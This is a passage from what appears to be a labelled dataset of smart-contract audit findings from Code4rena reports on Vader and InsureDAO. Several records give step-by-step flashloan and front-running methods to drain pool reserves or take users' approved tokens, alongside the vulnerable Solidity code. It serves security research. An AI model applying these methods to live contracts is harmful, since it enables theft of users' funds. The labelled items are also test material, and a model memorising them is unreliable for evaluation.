\"bug_description\": \" \\\"Oracle returns an improperly scaled USDV/VADER price\\\"\",\n    \"line\": \"LiquidityBasedTWAP[393],FixedPoint[137],USDV[109]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-05-oracle-returns-an-improperly-scaled-usdvvader-price\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain\",\n      \"Invalid values returned from oracle in vast majority of situations.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The LBT oracle does not properly scale values when calculating prices for VADER or USDV. To show this we consider the simplest case where we expect USDV to return a value of $1 and show that the oracle does not return this value.\",\n      \"Consider the case of the LBT oracle tracking a single USDV-DAI pair where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1. We then work through the lines linked below:\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409\",\n      \"For L397 we get a value of 1e8 as Chainlink reports the price of DAI with 8 decimals of accuracy.\",\n      \"foreignPrice = getChainlinkPrice(address(foreignAsset));\\nforeignPrice = 1e8\",\n      \"We can setliquidityWeights[i]andtotalUSDVLiquidityWeightboth to 1 as we only consider a single pair so L399-401 becomes\",\n      \"totalUSD = foreignPrice;\\ntotalUSD = 1e8;\",\n      \"L403-408 is slightly more complex but from looking at the links below we can calculatetotalUSDVas shownhttps://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L81-L90https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/external/libraries/FixedPoint.sol#L137-L160\",\n      \"totalUSDV = pairData\\n.nativeTokenPriceAverage\\n.mul(pairData.foreignUnit)\\n.decode144()\\n// pairData.nativeTokenPriceAverage == 2**112\\n// pairData.foreignUnit = 10**18\\n// decode144(x) = x >> 112\\ntotalUSDV = (2**112).mul(10**18).decode144()\\ntotalUSDV = 10**18\",\n      \"UsingtotalUSDandtotalUSDVwe can then calculate the return value of_calculateUSDVPrice\",\n      \"returnValue = (totalUSD * 1 ether) / totalUSDV;\\nreturnValue = 1e8 * 1e18 / 1e18\\nreturnValue = 1e8\",\n      \"For the oracle implementation to be correct we then expect that the Vader protocol to treat values of 1e8 from the oracle to mean USDV is worth $1. However from the lines of code linked below we can safely assume that it is intended to be that values of 1e18 represent$1 rather than 1e8.\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L76https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109\",\n      \"High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Go over oracle calculation again to ensure that various scale factors are properly accounted for. Some handling of the difference in the number of decimals between the chainlink oracle and the foreign asset should be added.\",\n      \"Build a test suite to ensure that the oracle returns the expected values for simple situations.\",\n      \"SamSteinGG (Vader) confirmed\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 139,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.\\\"\",\n    \"line\": \"VaderPoolV2[220,265],VaderMath[72]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-06-lps-of-vaderpoolv2-can-manipulate-pool-reserves-to-extract-funds-from-the-reserve\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by hyh\",\n      \"Impermanent loss protection can be exploited to drain the reserve.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"InVaderPoolV2.burnwe calculate the current losses that the LP has made to impermanent loss.\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L265-L296\",\n      \"These losses are then refunded to the LP in VADER tokens from the reserve.\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/router/VaderRouterV2.sol#L220\",\n      \"This loss is calculated by the current reserves of the pool so if an LP can manipulate the pool‚Äôs reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/math/VaderMath.sol#L72-L92\",\n      \"The attack is then as follows.\",\n      \"Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)Flashloan a huge amount of one of the pool‚Äôs assets.Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.Remove your liquidity and receive compensation from the reserve for the IL you have engineered.Re-add your liquidity back to the pool.Trade against the pool to bring it back into balance.\",\n      \"The attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.\",\n      \"This is a high risk issue as after a year any large LP is incentivised and able to perform this attack and drain reserve funds.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use a manipulation resistant oracle for the relative prices of the pool‚Äôs assets (TWAP, etc.)\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 140,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Redemption value of synths can be manipulated to drain VaderPoolV2 of all native assets in the associated pair\\\"\",\n    \"line\": \"VaderPoolV2[153]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-07-redemption-value-of-synths-can-be-manipulated-to-drain-vaderpoolv2-of-all-native-assets-in-the-associated-pair\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by certora\",\n      \"Draining of funds fromVaderPoolV2.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"See theVaderPool.mintSynthfunction:https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L153-L194\",\n      \"As the pool‚Äôs reserves can be manipulated through flashloans similar to on UniswapV2 (the slip mechanism can be mitigated by splitting the manipulation over a number of trades), an attacker may set the exchange rate betweennativeAssetand synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\",\n      \"The attacker first flashloans and sells a huge amount offoreignAssetto the pool. The pool now thinksnativeAssetis extremely valuable.The attacker now uses a relatively small amount ofnativeAssetto mint synths usingVaderPool.mintSynth. As the pool thinksnativeAssetis very valuable the attacker will receive a huge amount of synths.The attacker can now manipulate the pool in the opposite direction by buying up theforeignAssetthey sold to the pool.nativeAssetis now back at its normal price, or perhaps artificially low if the attacker wishes.The attacker now burns all of their synths. AsnativeAssetis considered much less valuable than at the point the synths were minted it takes a lot more ofnativeAssetin order to pay out for the burned synths.\",\n      \"For the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount ofnativeAssetfrom the pool. This process can be repeated as long as it is profitable.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Tie the exchange rate use for minting/burning synths to a manipulation resistant oracle.\",\n      \"SamSteinGG (Vader) acknowledged\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 141,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Reserve does not properly apply prices of VADER and USDV tokens\\\"\",\n    \"line\": \"VaderReserve[95]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-08-reserve-does-not-properly-apply-prices-of-vader-and-usdv-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain\",\n      \"Reserve pays out vastly higher (or lower) IL protection than it should.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Consider the lines 98 and 102 as shown on the link below:\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/reserve/VaderReserve.sol#L95-L103\",\n      \"Here we multiply the IL experienced by the LP by a price for USDV or VADER as returned by the LBT. However the price from the oracle is a fixed point number (scaled up by 1e8 or 1e18 depending on the resolution of finding ‚ÄúOracle returns an improperly scaled USDV/VADER price‚Äù) and so a fixed scaling factor should be applied to convert back from a fixed point number to a standard integer.\",\n      \"As it stands depending on the branch which is executed, the amount to be reimbursed will be 1e18 times too large or too small. Should the ‚Äúelse‚Äù branch be executed the reserve will pay out much in terms of IL protection resulting in severe loss of funds. High severity.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Apply similar logic to as displayed here:\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 142,\n    \"bug_id\": \" H-09\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"USDV.sol Mint and Burn Amounts Are Incorrect\\\"\",\n    \"line\": \"USDV[66,100]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-09-usdvsol-mint-and-burn-amounts-are-incorrect\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood, also found by TomFrenchBlockchain\",\n      \"TheUSDV.mintfunction queries the price ofVaderfrom theLiquidityBasedTwapcontract. The calculation to determineuAmountinmintis actually performed incorrectly.uAmount = (vPrice * vAmount) / 1e18;will return theUSDamount for the providedVaderasvPriceis denominated inUSD/Vader. ThisuAmountis subsequently used when minting tokens for the user (locked for a period of time) and fee to the contract owner.\",\n      \"This same issue also applies to howvAmount = (uPrice * uAmount) / 1e18;is calculated inUSDV.burn.\",\n      \"This is a severe issue, as themintandburnfunctions will always use an incorrect amount of tokens, leading to certain loss by either the protocol (if the user profits) or the user (if the user does not profit).\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L66-L98\",\n      \"function mint(uint256 vAmount)\\nexternal\\nonlyWhenNotLocked\\nreturns (uint256 uAmount)\\n{\\nuint256 vPrice = lbt.getVaderPrice();\\nvader.transferFrom(msg.sender, address(this), vAmount);\\nvader.burn(vAmount);\\nuAmount = (vPrice * vAmount) / 1e18;\\nif (cycleTimestamp <= block.timestamp) {\\ncycleTimestamp = block.timestamp + 24 hours;\\ncycleMints = uAmount;\\n} else {\\ncycleMints += uAmount;\\nrequire(\\ncycleMints <= dailyLimit,\\n\\\"USDV::mint: 24 Hour Limit Reached\\\"\\n);\\n}\\nif (exchangeFee != 0) {\\nuint256 fee = (uAmount * exchangeFee) / _MAX_BASIS_POINTS;\\nuAmount = uAmount - fee;\\n_mint(owner(), fee);\\n}\\n_mint(address(this), uAmount);\\n_createLock(LockTypes.USDV, uAmount);\\n}\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L100-L120\",\n      \"function burn(uint256 uAmount)\\nexternal\\nonlyWhenNotLocked\\nreturns (uint256 vAmount)\\n{\\nuint256 uPrice = lbt.getUSDVPrice();\\n_burn(msg.sender, uAmount);\\nvAmount = (uPrice * uAmount) / 1e18;\\nif (exchangeFee != 0) {\\nuint256 fee = (vAmount * exchangeFee) / _MAX_BASIS_POINTS;\\nvAmount = vAmount - fee;\\nvader.mint(owner(), fee);\\n}\\nvader.mint(address(this), vAmount);\\n_createLock(LockTypes.VADER, vAmount);\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider utilising bothgetVaderPriceandgetUSDVPricewhen calculating the expecteduAmountandvAmountto mint or burn. To calculateuAmountinmint,vPriceshould be denominated inUSDV/Vader. To calculatevAmountinburn,uPriceshould be denominated inVader/USDV. It would be useful to add unit tests to test this explicitly as it is expected that users will interact with theUSDV.solcontract frequently.\",\n      \"0xstormtrooper (Vader) disputed and commented:\",\n      \"Mint / burn calculation with USD is intentional, modeled after LUNA / UST.Mint USDV1 USD worth of Vader should mint 1 USDVBurn USDV1 USDV should mint 1 USD worth of Vaderhttps://docs.terra.money/Concepts/Protocol.html#expansion-and-contraction\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 143,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"previousPrices Is Never Updated Upon Syncing Token Price\\\"\",\n    \"line\": \"LiquidityBasedTWAP[150,221]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-10-previousprices-is-never-updated-upon-syncing-token-price\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"TheLiquidityBasedTWAPcontract attempts to accurately track the price ofVADERandUSDVwhile still being resistant to flash loan manipulation and short-term volatility. ThepreviousPricesarray is meant to track the last queried price for the two available paths, namelyVADERandUSDV.\",\n      \"ThesetupVaderfunction configures theVADERtoken by settingpreviousPricesand adding a token pair. However,syncVaderPricedoes not updatepreviousPricesafter syncing, causingcurrentLiquidityEvaluationto be dependent on the initial price forVADER. As a result, liquidity weightings do not accurately reflect the current and most up to date price forVADER.\",\n      \"This same issue also affects howUSDVcalculatescurrentLiquidityEvaluation.\",\n      \"This issue is of high risk and heavily impacts the accuracy of the TWAP implementation as the set price forVADER/USDVdiverges from current market prices. For example, as the Chainlink oracle price and initial price forVADERdiverge,currentLiquidityEvaluationwill begin to favour either on-chain or off-chain price data depending on which price result is greater. The following calculation forcurrentLiquidityEvaluationoutlines this behaviour.\"\n    ],\n    \"code_blocks\": [\n      \"currentLiquidityEvaluation =\\n(reserveNative * previousPrices[uint256(Paths.VADER)]) +\\n(reserveForeign * getChainlinkPrice(pairData.foreignAsset));\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L150-L189\",\n      \"function _updateVaderPrice(\\nIUniswapV2Pair pair,\\nExchangePair storage pairData,\\nuint256 timeElapsed\\n) internal returns (uint256 currentLiquidityEvaluation) {\\nbool isFirst = pair.token0() == vader;\\n(uint256 reserve0, uint256 reserve1, ) = pair.getReserves();\\n(uint256 reserveNative, uint256 reserveForeign) = isFirst\\n? (reserve0, reserve1)\\n: (reserve1, reserve0);\\n(\\nuint256 price0Cumulative,\\nuint256 price1Cumulative,\\nuint256 currentMeasurement\\n) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\\nuint256 nativeTokenPriceCumulative = isFirst\\n? price0Cumulative\\n: price1Cumulative;\\nunchecked {\\npairData.nativeTokenPriceAverage = FixedPoint.uq112x112(\\nuint224(\\n(nativeTokenPriceCumulative -\\npairData.nativeTokenPriceCumulative) / timeElapsed\\n)\\n);\\n}\\npairData.nativeTokenPriceCumulative = nativeTokenPriceCumulative;\\npairData.lastMeasurement = currentMeasurement;\\ncurrentLiquidityEvaluation =\\n(reserveNative * previousPrices[uint256(Paths.VADER)]) +\\n(reserveForeign * getChainlinkPrice(pairData.foreignAsset));\\n}\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221-L235\",\n      \"function setupVader(\\nIUniswapV2Pair pair,\\nIAggregatorV3 oracle,\\nuint256 updatePeriod,\\nuint256 vaderPrice\\n) external onlyOwner {\\nrequire(\\npreviousPrices[uint256(Paths.VADER)] == 0,\\n\\\"LBTWAP::setupVader: Already Initialized\\\"\\n);\\npreviousPrices[uint256(Paths.VADER)] = vaderPrice;\\n_addVaderPair(pair, oracle, updatePeriod);\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider updatingpreviousPrices[uint256(Paths.VADER)]andpreviousPrices[uint256(Paths.USDV)]after syncing the respective prices for the two tokens. This will ensure the most up to date price is used when evaluating liquidity for all available token pairs.\",\n      \"SamSteinGG (Vader) acknowledged\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 144,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts\\\"\",\n    \"line\": \"Factory[158],PoolTemplate[178]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-insure#h-03-malicious-market-creators-can-steal-tokens-from-unsuspecting-approved-reference-accounts\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood\",\n      \"The current method of market creation involves callingFactory.createMarket()with a list of approved_conditionsand_referencesaccounts. If a registered template address hastemplates[address(_template)].isOpen == true, then any user is able to callcreateMarket()using this template. If the template points toPoolTemplate.sol, then a malicious market creator can abusePoolTemplate.initialize()as it makes a vault deposit from an account that they control. The vulnerable internal function,_depositFrom(), makes a vault deposit from the_references[4]address (arbitrarily set to an approved reference address upon market creation).\",\n      \"Hence, if approved_referencesaccounts have set an unlimited approval amount forVault.solbefore deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.\",\n      \"This issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval toVault.solwas set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow.\",\n      \"Manual code review.\\nDiscussions with kohshiba.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231\",\n      \"function\\ncreateMarket\\n(\\nIUniversalMarket\\n_template\\n,\\nstring\\nmemory\\n_metaData\\n,\\nuint256\\n[]\\nmemory\\n_conditions\\n,\\naddress\\n[]\\nmemory\\n_references\\n)\\npublic\\noverride\\nreturns\\n(\\naddress\\n) {\\n//check eligibility\\nrequire\\n(\\ntemplates\\n[\\naddress\\n(\\n_template\\n)].\\napproval\\n==\\ntrue\\n,\\n\\\"ERROR: UNAUTHORIZED_TEMPLATE\\\"\\n);\\nif\\n(\\ntemplates\\n[\\naddress\\n(\\n_template\\n)].\\nisOpen\\n==\\nfalse\\n) {\\nrequire\\n(\\nownership\\n.\\nowner\\n() ==\\nmsg\\n.\\nsender\\n,\\n\\\"ERROR: UNAUTHORIZED_SENDER\\\"\\n);\\n}\\nif\\n(\\n_references\\n.\\nlength\\n>\\n0\\n) {\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\n_references\\n.\\nlength\\n;\\ni\\n++) {\\nrequire\\n(\\nreflist\\n[\\naddress\\n(\\n_template\\n)][\\ni\\n][\\n_references\\n[\\ni\\n]] ==\\ntrue\\n||\\nreflist\\n[\\naddress\\n(\\n_template\\n)][\\ni\\n][\\naddress\\n(\\n0\\n)] ==\\ntrue\\n,\\n\\\"ERROR: UNAUTHORIZED_REFERENCE\\\"\\n);\\n}\\n}\\nif\\n(\\n_conditions\\n.\\nlength\\n>\\n0\\n) {\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\n_conditions\\n.\\nlength\\n;\\ni\\n++) {\\nif\\n(\\nconditionlist\\n[\\naddress\\n(\\n_template\\n)][\\ni\\n] >\\n0\\n) {\\n_conditions\\n[\\ni\\n] =\\nconditionlist\\n[\\naddress\\n(\\n_template\\n)][\\ni\\n];\\n}\\n}\\n}\\nif\\n(\\nIRegistry\\n(\\nregistry\\n).\\nconfirmExistence\\n(\\naddress\\n(\\n_template\\n),\\n_references\\n[\\n0\\n]\\n) ==\\nfalse\\n) {\\nIRegistry\\n(\\nregistry\\n).\\nsetExistence\\n(\\naddress\\n(\\n_template\\n),\\n_references\\n[\\n0\\n]\\n);\\n}\\nelse\\n{\\nif\\n(\\ntemplates\\n[\\naddress\\n(\\n_template\\n)].\\nallowDuplicate\\n==\\nfalse\\n) {\\nrevert\\n(\\n\\\"ERROR: DUPLICATE_MARKET\\\"\\n);\\n}\\n}\\n//create market\\nIUniversalMarket\\nmarket\\n=\\nIUniversalMarket\\n(\\n_createClone\\n(\\naddress\\n(\\n_template\\n))\\n);\\nIRegistry\\n(\\nregistry\\n).\\nsupportMarket\\n(\\naddress\\n(\\nmarket\\n));\\nmarkets\\n.\\npush\\n(\\naddress\\n(\\nmarket\\n));\\n//initialize\\nmarket\\n.\\ninitialize\\n(\\n_metaData\\n,\\n_conditions\\n,\\n_references\\n);\\nemit\\nMarketCreated\\n(\\naddress\\n(\\nmarket\\n),\\naddress\\n(\\n_template\\n),\\n_metaData\\n,\\n_conditions\\n,\\n_references\\n);\\nreturn\\naddress\\n(\\nmarket\\n);\\n}\",\n      \"https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221\",\n      \"function\\ninitialize\\n(\\nstring\\ncalldata\\n_metaData\\n,\\nuint256\\n[]\\ncalldata\\n_conditions\\n,\\naddress\\n[]\\ncalldata\\n_references\\n)\\nexternal\\noverride\\n{\\nrequire\\n(\\ninitialized\\n==\\nfalse\\n&&\\nbytes\\n(\\n_metaData\\n).\\nlength\\n>\\n0\\n&&\\n_references\\n[\\n0\\n] !=\\naddress\\n(\\n0\\n) &&\\n_references\\n[\\n1\\n] !=\\naddress\\n(\\n0\\n) &&\\n_references\\n[\\n2\\n] !=\\naddress\\n(\\n0\\n) &&\\n_references\\n[\\n3\\n] !=\\naddress\\n(\\n0\\n) &&\\n_references\\n[\\n4\\n] !=\\naddress\\n(\\n0\\n) &&\\n_conditions\\n[\\n0\\n] <=\\n_conditions\\n[\\n1\\n],\\n\\\"ERROR: INITIALIZATION_BAD_CONDITIONS\\\"\\n);\\ninitialized\\n=\\ntrue\\n;\\nstring\\nmemory\\n_name\\n=\\nstring\\n(\\nabi\\n.\\nencodePacked\\n(\\n\\\"InsureDAO-\\\"\\n,\\nIERC20Metadata\\n(\\n_references\\n[\\n1\\n]).\\nname\\n(),\\n\\\"-PoolInsurance\\\"\\n)\\n);\\nstring\\nmemory\\n_symbol\\n=\\nstring\\n(\\nabi\\n.\\nencodePacked\\n(\\n\\\"i-\\\"\\n,\\nIERC20Metadata\\n(\\n_references\\n[\\n1\\n]).\\nsymbol\\n())\\n);\\nuint8\\n_decimals\\n=\\nIERC20Metadata\\n(\\n_references\\n[\\n0\\n]).\\ndecimals\\n();\\ninitializeToken\\n(\\n_name\\n,\\n_symbol\\n,\\n_decimals\\n);\\nregistry\\n=\\nIRegistry\\n(\\n_references\\n[\\n2\\n]);\\nparameters\\n=\\nIParameters\\n(\\n_references\\n[\\n3\\n]);\\nvault\\n=\\nIVault\\n(\\nparameters\\n.\\ngetVault\\n(\\n_references\\n[\\n1\\n]));\\nmetadata\\n=\\n_metaData\\n;\\nmarketStatus\\n=\\nMarketStatus\\n.\\nTrading\\n;\\nif\\n(\\n_conditions\\n[\\n1\\n] >\\n0\\n) {\\n_depositFrom\\n(\\n_conditions\\n[\\n1\\n],\\n_references\\n[\\n4\\n]);\\n}\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"After discussions with the sponsor, they have opted to parse a_creatoraddress toPoolTemplate.solwhich will act as the depositor and be set tomsg.senderinFactory.createMarket(). This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved inFactory.soland have also approvedVault.solto make transfers on their behalf.\",\n      \"oishun1112 (Insure) confirmed:\",\n      \"https://github.com/code-423n4/2022-01-insure-findings/issues/250\"\n    ]\n  },\n  {\n    \"row_number\": 145,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Initial pool deposit can be stolen\\\"\",\n    \"line\": \"Factory[158],PoolTemplate[178]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-insure#h-04-initial-pool-deposit-can-be-stolen\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by WatchPug\",\n      \"Note that thePoolTemplate.initializefunction, called when creating a market withFactory.createMarket, calls a vault function to transfer an initial deposit amount (conditions[1])fromthe initial depositor (_references[4]):\",\n      \"The initial depositor needs to first approve the vault contract for thetransferFromto succeed.\",\n      \"An attacker can then frontrun theFactory.createMarkettransaction with their own market creation (it does not have access restrictions) and create a marketwith different parametersbut still passing in_conditions[1]=amountand_references[4]=victim.\",\n      \"A market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.\"\n    ],\n    \"code_blocks\": [\n      \"// PoolTemplate\\nfunction\\ninitialize\\n(\\nstring\\ncalldata\\n_metaData\\n,\\nuint256\\n[]\\ncalldata\\n_conditions\\n,\\naddress\\n[]\\ncalldata\\n_references\\n)\\nexternal\\noverride\\n{\\n// ...\\nif\\n(\\n_conditions\\n[\\n1\\n] >\\n0\\n) {\\n// @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])\\n_depositFrom\\n(\\n_conditions\\n[\\n1\\n],\\n_references\\n[\\n4\\n]);\\n}\\n}\\nfunction\\n_depositFrom\\n(\\nuint256\\n_amount\\n,\\naddress\\n_from\\n)\\ninternal\\nreturns\\n(\\nuint256\\n_mintAmount\\n)\\n{\\nrequire\\n(\\nmarketStatus\\n==\\nMarketStatus\\n.\\nTrading\\n&&\\npaused\\n==\\nfalse\\n,\\n\\\"ERROR: DEPOSIT_DISABLED\\\"\\n);\\nrequire\\n(\\n_amount\\n>\\n0\\n,\\n\\\"ERROR: DEPOSIT_ZERO\\\"\\n);\\n_mintAmount\\n=\\nworth\\n(\\n_amount\\n);\\n// @audit vault calls asset.transferFrom(_from, vault, _amount)\\nvault\\n.\\naddValue\\n(\\n_amount\\n,\\n_from\\n,\\naddress\\n(\\nthis\\n));\\nemit\\nDeposit\\n(\\n_from\\n,\\n_amount\\n,\\n_mintAmount\\n);\\n//mint iToken\\n_mint\\n(\\n_from\\n,\\n_mintAmount\\n);\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Can the initial depositor be set toFactory.createMarket‚Äôsmsg.sender, instead of being able to pick a whitelisted one as_references[4]?\",\n      \"oishun1112 (Insure) confirmed:\",\n      \"https://github.com/code-423n4/2022-01-insure-findings/issues/224\"\n    ]\n  },\n  {\n    \"row_number\": 146,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"PoolTemplate.sol#resume() Wrong implementation of resume() will compensate overmuch redeem amount from index pools\\\"\",\n    \"line\": \"PoolTemplate[700]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-insure#h-11-pooltemplatesolresume-wrong-implementation-of-resume-will-compensate-overmuch-redeem-amount-from-index-pools\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug, also found by danb\",\n      \"Wrong arithmetic.\",\n      \"https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717\"\n    ],\n    \"code_blocks\": [\n      \"uint256\\n_deductionFromIndex\\n= (\\n_debt\\n*\\n_totalCredit\\n*\\nMAGIC_SCALE_1E6\\n) /\\ntotalLiquidity\\n();\\nuint256\\n_actualDeduction\\n;\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\nindexList\\n.\\nlength\\n;\\ni\\n++) {\\naddress\\n_index\\n=\\nindexList\\n[\\ni\\n];\\nuint256\\n_credit\\n=\\nindicies\\n[\\n_index\\n].\\ncredit\\n;\\nif\\n(\\n_credit\\n>\\n0\\n) {\\nuint256\\n_shareOfIndex\\n= (\\n_credit\\n*\\nMAGIC_SCALE_1E6\\n) /\\n_totalCredit\\n;\\nuint256\\n_redeemAmount\\n=\\n_divCeil\\n(\\n_deductionFromIndex\\n,\\n_shareOfIndex\\n);\\n_actualDeduction\\n+=\\nIIndexTemplate\\n(\\n_index\\n).\\ncompensate\\n(\\n_redeemAmount\\n);\\n}\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"totalLiquidity = 200,000* 10**18;totalCredit = 100,000 * 10**18;debt = 10,000 * 10**18;[Index Pool 1] Credit = 20,000 * 10**18;[Index Pool 2] Credit = 30,000 * 10**18;\",\n      \"uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\\ntotalLiquidity();\\n// _deductionFromIndex = 10,000 * 10**6 * 10**18;\",\n      \"[Index Pool 1]:\",\n      \"uint256\\n_shareOfIndex\\n= (\\n_credit\\n*\\nMAGIC_SCALE_1E6\\n) /\\n_totalCredit\\n;\\n//  _shareOfIndex = 200000\\nuint256\\n_redeemAmount\\n=\\n_divCeil\\n(\\n_deductionFromIndex\\n,\\n_shareOfIndex\\n);\\n// _redeemAmount = 25,000 * 10**18;\",\n      \"[Index Pool 2]:\",\n      \"uint256\\n_shareOfIndex\\n= (\\n_credit\\n*\\nMAGIC_SCALE_1E6\\n) /\\n_totalCredit\\n;\\n//  _shareOfIndex = 300000\\nuint256\\n_redeemAmount\\n=\\n_divCeil\\n(\\n_deductionFromIndex\\n,\\n_shareOfIndex\\n);\\n// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)\",\n      \"In most cases, the transaction will revet on underflow at:\",\n      